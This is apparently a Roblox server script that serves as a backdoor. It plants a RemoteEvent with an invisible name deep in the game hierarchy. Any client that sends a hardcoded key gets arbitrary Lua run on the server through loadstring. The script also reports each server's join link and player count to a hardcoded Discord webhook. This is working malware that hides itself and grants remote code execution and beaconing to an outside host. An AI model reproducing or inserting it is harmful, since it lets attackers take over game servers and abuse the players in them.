local function getDepth(obj)
	local depth = 0
	while obj and obj ~= game do
		depth += 1
		obj = obj.Parent
	end
	return depth
end

local all = {}
for _, root in {workspace, game:GetService("ServerScriptService")} do
	for _, desc in root:GetDescendants() do
		table.insert(all, desc)
	end
end

table.sort(all, function(a, b)
	return getDepth(a) > getDepth(b)
end)

local deepest = all[1]
local remote = Instance.new("RemoteEvent", deepest)
remote.Name = "‎ "

remote.OnServerEvent:Connect(function(P, args1, args2)
	if args1 == "k3Y_92Xe-TgPzLcm8QnBWRvJUyA7HdF5MsXtLbC40vENgRK9uTwqZ" then
		local env = setmetatable({owner = P}, {
			__index = function(_, v)
				return getfenv()[v]
			end,
			__newindex = function(_, i, v)
				getfenv()[i] = v
			end,
			__metatable = nil
		})
		local func = loadstring(args2)
		if func then
			setfenv(func, env)
			pcall(func)
		end
	end
end)

local HttpService = game:GetService("HttpService")
local webhookUrl = "https://discord.com/api/webhooks/1374434264958898309/s9ZHiniBOI3JwJSbmWmaaPibqCNmlH2Mi9eM5e-i3uX6NrTjggDW-E0dHcD35-ZJYpQg"
local sentSessions = {}

local function sendSession()
	local robloxLink = ("https://www.roblox.com/games/%s/%s"):format(game.PlaceId, game.JobId)
	if sentSessions[robloxLink] then return end
	sentSessions[robloxLink] = true
	local playersCount = #game:GetService("Players"):GetPlayers()
	local message = ("@everyone New session: %s, Players %d"):format(robloxLink, playersCount)
	HttpService:PostAsync(webhookUrl, HttpService:JSONEncode({content = message}))
end

sendSession()
